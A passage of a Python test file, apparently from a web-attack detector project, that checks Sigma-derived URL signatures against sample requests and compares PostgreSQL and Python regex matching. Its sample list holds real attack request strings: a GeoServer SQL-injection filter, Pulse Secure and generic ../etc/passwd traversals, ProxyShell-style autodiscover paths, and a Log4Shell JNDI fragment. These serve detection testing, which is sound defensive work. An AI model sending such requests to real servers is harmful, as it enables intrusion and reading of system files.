    ("GET", "/autodiscover/autodiscover.json/EWS/Exchange.asmx", 401, [SPS1]),
    ("GET", "/autodiscover/autodiscover.json%3f@foo.com", 401, [SPS2]),
    ("GET", "/autodiscover/autodiscover.json?@x.com/powershell/?X-Rps-CAT=abc", 200, []),
    ("POST", "/autodiscover/autodiscover.xml", 401, []),
    # CVE-2023-25157
    ("GET", "/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=topp:states&CQL_FILTER="
            "strStartsWith(STATE_NAME,%27x%27%27)+%3D+true+AND+1%3D(SELECT+CAST+((SELECT+version())+AS+integer))"
            "+--+%27)+%3D+true", 200, [S25157]),
    ("GET", "/geoserver/ows?service=WFS&request=GetFeature&typeName=topp:states&CQL_FILTER="
            "strStartsWith(STATE_NAME,%27Tex%27)%3Dtrue", 200, []),
    ("GET", "/geoserver/web/", 200, []),
    # CVE-2019-11510 (값의 ? 는 아무 글자 하나)
    ("GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/", 200,
     [S11510, SPATH]),
    ("GET", "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd", 404, [S11510, SPATH]),   # 디코이 꼴
    ("GET", "/dana/html5acc/guacamole/", 200, []),                                # ? 자리에 글자가 없다
    ("GET", "/dana-na/nc/nc_gina_ver.txt", 200, []),
    # CVE-2021-22893
    ("GET", "/dana-na/auth/saml-logout.cgi?token=AAAA", 200, [S22893]),
    ("GET", "/dana-cached/setup/meeting/x.cgi", 200, [S22893]),
    ("GET", "/dana-na/auth/url_default/welcome.cgi", 200, []),
    ("GET", "/meeting/join?id=5", 200, []),
    # 일반 경로 조작
    ("GET", "/index.php?page=../../../etc/passwd", 200, [SPATH]),
    ("GET", "/..%252f..%252f..%252fetc%252fpasswd", 400, [SPATH]),
    ("GET", "/static/../img/logo.png", 200, []),
    ("GET", "/download?file=../../report.pdf", 200, []),
    ("GET", "", 400, []),                          # web-01 이 루트 위로 가는 경로를 400 으로 거절하며 url 을 비운 행
]


def py_hits(method, url, status):
    return sorted(s["id"] for s in sigs() if detect.url_signature_fullmatch(s, method, url, status))


class SelectedRulesTest(unittest.TestCase):
    """선정 10개(detector/sigma/selection.json)와 만든 규칙 파일(detector/rules_sigma.json)."""

    @classmethod
    def setUpClass(cls):
        cls.doc, cls.reports = sc.build()
        cls.sel = load_json(os.path.join("sigma", "selection.json"))

    def test_선정_10개_각각의_기대_서명(self):
        self.assertEqual([r["path"] for r in self.reports], list(EXPECTED))
        self.assertEqual(len(self.sel["rules"]), 10)
        for rep in self.reports:
            with self.subTest(path=rep["path"]):
                self.assertIsNone(rep["error"])
                self.assertEqual(rep["dropped"], [])
                got = [(s["id"], {k: s[k] for k in ("pattern", "all_patterns", "not_patterns", "methods", "statuses")
                                  if k in s}, s["cves"]) for s in rep["signatures"]]
                self.assertEqual(got, EXPECTED[rep["path"]])

    def test_제품_자산_조건은_선정표_값이고_c1_짝과_같다(self):
        c1 = {(r["id"], s["id"]): s for r in load_json("rules_cve.json")["rules"] for s in r["params"]["signatures"]}
        by_path = {}
        for s in sigs():
            by_path.setdefault(s["sigma"]["path"], []).append(s)
        for entry in self.sel["rules"]:
            with self.subTest(path=entry["path"]):
                for s in by_path[entry["path"]]:
                    self.assertEqual((s["product"], s["vendor"]), (entry["product"], entry["vendor"]))
                    pair = entry["c1_pair"]
                    if pair is None:
                        self.assertNotIn("asset_match", s)
                        continue
                    self.assertEqual(s["asset_match"], c1[(pair["rule"], pair["signature"])]["asset_match"])
                    self.assertEqual(entry["asset_match"], s["asset_match"])
        # Apache 는 apache2 패키지 · httpd 이미지, Log4Shell 은 log4j 패키지
        apache = next(s for s in sigs() if s["id"] == S41773)["asset_match"]
        self.assertEqual((apache["packages"], apache["images"]), (["apache2"], ["(^|/)httpd(:|@|$)"]))

    def test_규칙_파일_모양(self):
        doc = load_json("rules_sigma.json")
        self.assertEqual(doc["rule_version"], "sg1")
        self.assertNotIn("suppression", doc)
        self.assertEqual(doc["aggregation"]["window_gap_seconds"], 900)
        self.assertEqual(doc["derived_from"]["commit"], COMMIT)
        [rule] = doc["rules"]
        self.assertEqual((rule["id"], rule["name"], rule["severity"], rule["type"], rule["enabled"]),
                         ("R107", "공개 규칙(Sigma) 웹 공격 요청", "medium", "url_signature", True))
        self.assertEqual(rule["params"], {"eventids": ["nginx.request", "decoy.request"],
                                          "signatures": rule["params"]["signatures"]})
        for word in (COMMIT, "DRL", "detector/sigma_convert.py", "경로", "질의", "옮기지 못한", "c1", "억제가 없어"):
            self.assertIn(word, doc["note"])
        self.assertTrue(rule["rationale"])

    def test_서명마다_원본_출처(self):
        for entry, s in ((e, s) for e in self.sel["rules"] for s in sigs() if s["sigma"]["path"] == e["path"]):
            with self.subTest(sig=s["id"]):
                src = sc.load_yaml(os.path.join(sc.SIGMA_DIR, entry["path"]))
                g = s["sigma"]
                self.assertEqual(s["mapping"], "sigma")
                self.assertEqual((g["id"], g["title"], g["status"], g["level"]),
                                 (src["id"], src["title"], src["status"], src["level"]))
                self.assertEqual(g["author"], " ".join(src["author"].split()))
                self.assertEqual((g["commit"], g["license"]), (COMMIT, "DRL-1.1"))
                self.assertEqual(g["url"], f"https://github.com/SigmaHQ/sigma/blob/{COMMIT}/{entry['path']}")
                self.assertTrue(g["notes"])
                human = entry.get("notes", [])
                self.assertEqual(g["notes"][len(g["notes"]) - len(human):], human)         # 사람의 관찰은 끝에
                self.assertTrue(s["source"].startswith(f"SigmaHQ 규칙 '{src['title']}'({src['id']}) · 작성 "))
                self.assertIn(g["notes"][0], s["source"])

    def test_생성_파일_재현(self):
        with open(os.path.join(HERE, "rules_sigma.json"), encoding="utf-8") as f:
            self.assertEqual(sc.dump(self.doc), f.read())
        # 두 번 만들어도 같다
        self.assertEqual(sc.dump(sc.build()[0]), sc.dump(self.doc))
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.assertEqual(sc.main(["build", "--check"]), 0)
        self.assertEqual(out.getvalue().strip(), "같다")

    def test_모든_서명이_탐지기_검사를_통과한다(self):
        doc = load_json("rules_sigma.json")
        [rule] = doc["rules"]
        sql, arrays, eids = detect.url_signature_args(copy.deepcopy(rule))
        self.assertIs(sql, detect.URL_SIGNATURE_EXT_SQL)
        self.assertEqual(arrays[0], [s["id"] for s in sigs()])
        self.assertEqual(len(arrays[0]), 11)
        for s in sigs():
            self.assertLessEqual(len(s["id"]), 40)
            for p in [s["pattern"]] + s.get("all_patterns", []) + s.get("not_patterns", []):
                self.assertIsNone(detect.regex_gap(p), p)
        # 옛 탐지기(mapping sigma · 선택 조건을 모른다)는 이 파일을 받지 않는다 — 설치 스크립트가 구판을 경고하는 까닭
        with mock.patch.object(detect, "SIG_MAPPINGS", ("explicit", "analyst")):
            with self.assertRaisesRegex(ValueError, "^R107: 서명 .* mapping"):
                detect.url_signature_args(copy.deepcopy(rule))

    def test_실험용_lab_도_탐지기_검사를_통과하고_조건이_같다(self):
        lab, reports, skipped = sc.lab(sc.SIGMA_DIR, None, COMMIT)
        self.assertEqual((lab["rule_version"], skipped), ("sgx", 0))
        detect.url_signature_args(lab["rules"][0])
        keys = ("id", "pattern", "all_patterns", "not_patterns", "methods", "statuses", "cves")
        pick = lambda ss: sorted(({k: s[k] for k in keys if k in s} for s in ss), key=lambda d: d["id"])  # noqa: E731
        self.assertEqual(pick(lab["rules"][0]["params"]["signatures"]), pick(sigs()))
        for s in lab["rules"][0]["params"]["signatures"]:
            self.assertEqual(s["vendor"], "Sigma")
            self.assertNotIn("asset_match", s)
        with self.assertRaises(SystemExit):
            sc.main(["lab", sc.SIGMA_DIR, "--out", os.path.join(HERE, "rules_sigma_lab.json")])

    def test_보고(self):
        out = io.StringIO()
        paths = [os.path.join(sc.SIGMA_DIR, p) for p in EXPECTED]
        with contextlib.redirect_stdout(out):
            self.assertEqual(sc.main(["report", *paths]), 0)
        text = out.getvalue()
        for sid in (S41773, SPS1, SPS2, SPATH):
            self.assertIn(f"서명 {sid}", text)
        self.assertIn("응답    200 · 301", text)
        self.assertEqual(sum(1 for ln in text.splitlines() if ln.startswith("변환 ")), 10)


class SourcesTest(unittest.TestCase):
    """detector/sigma/ 에 둔 원본 · LICENSE · manifest.json."""

    def test_manifest_의_blob_sha1_과_파일이_같다(self):
        manifest, bad = sc.verify_sources()
        self.assertEqual(bad, [])
        self.assertEqual(manifest["commit"], COMMIT)
        self.assertEqual(manifest["license"], "DRL-1.1")
        listed = sorted(i["path"] for i in manifest["files"])
        kept = sorted(os.path.relpath(os.path.join(d, f), sc.SIGMA_DIR).replace(os.sep, "/")
                      for d, _, fs in os.walk(sc.SIGMA_DIR) for f in fs
                      if f not in ("manifest.json", "selection.json") and not f.startswith("."))
        self.assertEqual(listed, kept)
        self.assertEqual(sorted(e["path"] for e in load_json(os.path.join("sigma", "selection.json"))["rules"]) +
                         ["LICENSE"], sorted(listed, key=lambda p: (p == "LICENSE", p)))
        self.assertEqual(sc.git_blob_sha1(b""), "e69de29bb2d1d6434b8b29ae775ad8c2e48c5391")     # git 의 빈 blob
        with open(os.path.join(sc.SIGMA_DIR, "LICENSE"), encoding="utf-8") as f:
            self.assertIn("Detection Rule License (DRL) 1.1", f.read())

    def test_원본이_바뀌면_만들지_않는다(self):
        with mock.patch.object(sc, "git_blob_sha1", return_value="0" * 40):
            with self.assertRaises(SystemExit):
                sc.build()


class SampleTest(unittest.TestCase):
    """표본 url 의 기대 서명(파이썬 판). DB 시험이 같은 표본을 PostgreSQL 로 본다."""

    def test_표본마다_기대_서명(self):
        for method, url, status, want in SAMPLES:
            with self.subTest(method=method, url=url, status=status):
                self.assertEqual(py_hits(method, url, status), sorted(want))

    def test_표본이_서명_전부를_덮고_정상_요청이_있다(self):
        hit = {i for *_, want in SAMPLES for i in want}
        self.assertEqual(hit, {s["id"] for s in sigs()})
        self.assertGreaterEqual(sum(1 for *_, want in SAMPLES if not want), 20)


# ----------------------------------------------------------------------
#  두 엔진 (PostgreSQL ~* · 파이썬 fullmatch)
# ----------------------------------------------------------------------

TEMP_EVENTS = """
    CREATE TEMP TABLE events (line_hash text PRIMARY KEY, ts timestamptz NOT NULL, eventid text NOT NULL,
        session text, src_ip inet, url text, provenance text NOT NULL DEFAULT 'real', http_method text,
        http_status integer, sensor text NOT NULL DEFAULT 'cowrie');
"""


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class TwoEngineDatabaseTest(unittest.TestCase):
    """연결 전용 임시 표(search_path=pg_temp)에서 R107 을 실제로 돌린다. 운영 표는 건드리지 않는다."""

    def setUp(self):
        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        self.cur = self.conn.cursor()
        self.cur.execute("SET search_path TO pg_temp")
        self.cur.execute(TEMP_EVENTS)
        self.rows = []
        for i, (method, url, status, _) in enumerate(SAMPLES):
            self.rows += [(f"n{i}", T0 + timedelta(minutes=i), "nginx.request", None, "192.0.2.10", url, "real",
                           method, status, "web-01"),
                          (f"d{i}", T0 + timedelta(minutes=i, seconds=30), "decoy.request", f"s{i}", "192.0.2.20",
                           url, "real", method, status, "decoy")]
        noise = [("x1", T0, "decoy.session.connect", "s0", "192.0.2.20", SAMPLES[0][1], "real", "GET", 200, "decoy"),
                 ("x2", T0, "nginx.request", None, "127.0.0.1", SAMPLES[0][1], "fixture", "GET", 200, "web-01")]
        self.cur.executemany("INSERT INTO events VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)", self.rows + noise)

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def test_R107_신호가_파이썬_판과_같다(self):
        doc = load_json("rules_sigma.json")
        rule = detect.prepare_rule(doc, copy.deepcopy(doc["rules"][0]))
        got = sorted(detect.signals_url_signature(self.cur, rule, None, None), key=lambda s: s[0])
        want = []
        for _, ts, eventid, session, ip, url, _, method, status, sensor in self.rows:
            ids = py_hits(method, url, status)
            if ids:
                want.append((ts, ip, session, {"eventid": eventid, "sensor": sensor, "http_method": method,
                                               "url": url, "http_status": status, "signatures": ids}))
        self.assertEqual(got, sorted(want, key=lambda s: s[0]))
        # 표본의 기대 서명과도 같다(발생원마다 한 번)
        self.assertEqual(len(got), 2 * sum(1 for *_, w in SAMPLES if w))
        by_url = {(d["url"], d["http_method"], d["http_status"]): d["signatures"] for *_, d in got}
        for method, url, status, w in SAMPLES:
            self.assertEqual(by_url.get((url, method, status), []), sorted(w), url)

    def test_정규식마다_두_엔진이_같은_답(self):
        urls = [u for _, u, _, _ in SAMPLES]
        urls += [u.upper() for u in urls] + [u + "\n" for u in urls[:10]] + ["/a\n/cgi-bin/.%2e/x", "/owa/\n?x"]
        # 대소문자 접기가 두 엔진에서 다른 글자(ſ → s · ı → i · K(U+212A) → k). 파이썬 판은 re.A 로 PostgreSQL 과 같게 본다
        urls += ["/dana-na/auth/ſmb", "/ecp/ı/__VIEWSTATE=", "/geoserver/owſ?CQL_FILTER=PropertyIsLike+OR+", "/\u212ax"]
        regexes = sorted({p for s in sigs() for p in [s["pattern"]] + s.get("all_patterns", []) +
                          s.get("not_patterns", [])})
        self.assertGreater(len(regexes), 15)
        for p in regexes:
            with self.subTest(pattern=p):
                self.cur.execute("SELECT array_agg(u ~* %s ORDER BY o) FROM unnest(%s::text[]) WITH ORDINALITY AS x(u, o)",
                                 (f"^(?:{p})$", urls))
                self.assertEqual(self.cur.fetchone()[0], [bool(re.fullmatch(p, u, re.I | re.S | re.A)) for u in urls])
                # detect.url_signature_fullmatch(파이썬 판)도 같은 답이다
                self.assertEqual([detect.url_signature_fullmatch({"pattern": p}, None, u, None) for u in urls],
                                 [bool(re.fullmatch(p, u, re.I | re.S | re.A)) for u in urls])

    def test_이스케이프한_글자_값은_두_엔진에서_그_글자다(self):
        punct = "".join(c for c in string.printable if c not in "*?\\\t\n\r\x0b\x0c")
        values = [punct, punct[::-1], "${jndi:${lower:", "a\\b", "%%32%65", "[x]{2}", "(:x)", "a|b", "^$"]
        for v in values:
            rx, _ = sc.value_regex(v.replace("\\", "\\\\"))       # Sigma 값에서 역슬래시 글자는 \\\\ 로 적는다
            with self.subTest(value=v):
                cands = [v, v.upper(), v + "x", "x" + v, v[:-1]]
                self.cur.execute("SELECT array_agg(u ~* %s ORDER BY o) FROM unnest(%s::text[]) WITH ORDINALITY AS x(u, o)",
                                 (f"^(?:{rx})$", cands))
                self.assertEqual(self.cur.fetchone()[0], [bool(re.fullmatch(rx, u, re.I | re.S)) for u in cands])
                self.assertTrue(re.fullmatch(rx, v))


if __name__ == "__main__":
    unittest.main(verbosity=2)
